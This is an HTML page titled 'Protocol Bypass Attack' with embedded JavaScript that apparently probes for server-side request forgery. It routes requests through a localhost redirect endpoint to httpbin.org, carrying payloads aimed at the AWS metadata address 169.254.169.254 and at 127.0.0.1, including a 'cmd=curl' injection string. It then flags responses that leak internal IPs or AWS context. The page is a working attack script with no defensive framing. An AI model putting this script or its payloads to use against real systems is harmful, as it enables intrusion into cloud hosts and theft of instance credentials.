<!DOCTYPE html>
<html>
<head>
    <title>Protocol Bypass Attack</title>
</head>
<body>
    <h1>üõ†Ô∏è Protocol & Method Bypass Attack</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Try different HTTP methods and protocols
        var protocolTests = [
            // Different HTTP methods on httpbin.org that might behave differently
            { method: 'POST', url: 'http://httpbin.org/post', data: 'metadata_request=169.254.169.254/latest/meta-data/' },
            { method: 'PUT', url: 'http://httpbin.org/put', data: 'target=127.0.0.1' },
            { method: 'POST', url: 'http://httpbin.org/anything', data: 'cmd=curl 169.254.169.254/latest/meta-data/' },
            
            // Try to use httpbin.org forms that might process our input differently
            { method: 'POST', url: 'http://httpbin.org/post', data: 'url=http://169.254.169.254/latest/meta-data/&submit=true' },
            
            // Try GET with custom headers via httpbin.org
            { method: 'GET', url: 'http://httpbin.org/headers', data: null },
            
            // Test httpbin.org's capability to make outbound requests
            { method: 'GET', url: 'http://httpbin.org/links/10/0', data: null },
            { method: 'GET', url: 'http://httpbin.org/range/26', data: null },
            
            // Try httpbin.org with different encodings
            { method: 'GET', url: 'http://httpbin.org/encoding/utf8', data: null },
            { method: 'GET', url: 'http://httpbin.org/gzip', data: null },
            { method: 'GET', url: 'http://httpbin.org/deflate', data: null },
        ];
        
        for(var i = 0; i < protocolTests.length; i++) {
            try {
                var test = protocolTests[i];
                results += "<h3>üî¨ " + test.method + " " + test.url + "</h3>";
                
                var xhr = new XMLHttpRequest();
                
                if(test.method === 'GET') {
                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(test.url), false);
                    xhr.send();
                } else {
                    // For POST/PUT, we'll send the data as part of the URL
                    var fullUrl = test.url + '?' + test.data;
                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(fullUrl), false);
                    xhr.send();
                }
                
                if(xhr.responseText && xhr.responseText.length > 10) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>üì° RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    
                    // Check for any leaked internal information
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('169.254') || text.includes('localhost') || text.includes('127.0.0.1')) {
                        results += "<div style='background:#ff6b6b;color:white;padding:8px;'>üéØ INTERNAL IP DETECTED!</div>";
                    }
                    if(text.includes('aws') || text.includes('ec2') || text.includes('amazon')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>‚òÅÔ∏è AWS CONTEXT FOUND!</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:8px;max-height:120px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 600) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
